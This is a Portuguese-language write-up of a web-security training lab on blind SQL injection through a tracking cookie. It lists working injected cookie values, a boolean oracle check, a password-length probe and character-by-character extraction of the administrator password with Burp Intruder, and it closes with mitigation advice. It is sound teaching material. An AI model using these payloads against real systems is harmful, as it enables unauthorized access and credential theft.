### 🛠️ Lab: Blind SQL injection with conditional responses

#### 📝 Descrição do Cenário

A aplicação utiliza um cookie de rastreamento (`TrackingId`) para fins de analytics, e esse valor é inserido diretamente em uma consulta SQL no backend. Diferente do Lab 1, aqui a aplicação **não retorna os resultados da consulta** nem exibe mensagens de erro — trata-se de uma injeção **cega (blind)**.

A consulta interna provavelmente segue este formato:

```sql
SELECT * FROM tracking WHERE trackingId = 'valor_do_cookie'
```

O único sinal observável de que a consulta retornou alguma linha é a presença da mensagem `"Welcome back"` na resposta HTTP — um indicador binário (verdadeiro/falso) que serve como *oráculo* para o ataque.

#### 🔓 Objetivo (Perspectiva de Ataque)

Explorar a injeção cega para, sem nunca visualizar os dados diretamente, inferir — caractere por caractere — a senha do usuário `administrator`, e utilizá-la para realizar login com sucesso.

#### 🚀 Resolução (Exploração na Prática)

A exploração foi feita via **Burp Suite** (Proxy → Repeater → Intruder), manipulando o valor do cookie `TrackingId`.

**1. Confirmação do oráculo booleano:**

```
Cookie: TrackingId=xyz' AND '1'='1     → Welcome back aparece  (verdadeiro)
Cookie: TrackingId=xyz' AND '1'='2     → Welcome back some      (falso)
```

**2. Confirmação da existência da tabela `users`:**

```
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**3. Confirmação do usuário `administrator`:**

```
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**4. Determinação do tamanho da senha (busca incremental com `LENGTH`):**

```
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
```

Testando `N` de forma crescente até a condição deixar de ser verdadeira. Senha identificada com **20 caracteres**.

**5. Extração caractere por caractere (`SUBSTRING` + Burp Intruder):**

```
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,POS,1) FROM users WHERE username='administrator')='C'
```

Payload automatizado no **Burp Intruder**:
- **Positions:** marcador `§§` no caractere candidato (`C`);
- **Payloads:** lista simples com `a-z` e `0-9` (36 valores);
- **Settings → Grep - Match:** termo `Welcome back`, para sinalizar automaticamente a resposta positiva em cada requisição.

O processo foi repetido para as 20 posições da senha (alterando o índice inicial do `SUBSTRING`), reconstruindo o valor completo.

#### 🧠 Explicação Teórica

Diferente de um ataque `UNION` (onde os dados extraídos aparecem diretamente na resposta), aqui a exploração depende de **inferência por comportamento observável**. Cada requisição injeta uma condição lógica unida por `AND` à cláusula `WHERE` original:

```sql
SELECT * FROM tracking WHERE trackingId = 'xyz' AND (SELECT ... ) = 'a'
```

Se a subcondição for verdadeira, a linha original ainda é retornada e a aplicação renderiza `"Welcome back"`. Se for falsa, nenhuma linha é retornada e a mensagem desaparece — transformando a aplicação em um **oráculo binário** que pode ser interrogado repetidamente até reconstruir informações completas.

Um detalhe técnico relevante: subqueries que podem retornar **mais de uma linha** (como `SELECT 'a' FROM users`, sem filtro) quebram a comparação de igualdade simples (`= 'a'`), causando falso-negativo. Por isso, é necessário `LIMIT 1` ou uma cláusula `WHERE` suficientemente específica (como `username = 'administrator'`, que já é único por natureza).

#### 🛡️ Mitigação e Prevenção (Perspectiva de Defesa)

As mesmas práticas do Lab 1 se aplicam aqui, com reforços específicos para cenários de injeção cega:

- **Consultas parametrizadas (Prepared Statements)** — elimina a possibilidade de o valor do cookie alterar a estrutura lógica da query;
- **Não confiar em nenhum dado controlado pelo cliente**, incluindo cookies de rastreamento/analytics, que muitas vezes recebem menos escrutínio de segurança do que parâmetros de URL ou formulários;
- **Monitoramento de padrões anômalos de tráfego** — um ataque blind gera um volume alto de requisições muito similares em curto intervalo de tempo (característica detectável por WAFs e sistemas de rate-limiting);
- **Respostas de erro genéricas e uniformes**, evitando que qualquer diferença de comportamento (mensagens condicionais, tempo de resposta, tamanho da resposta) vaze informação sobre o estado interno da aplicação.

---
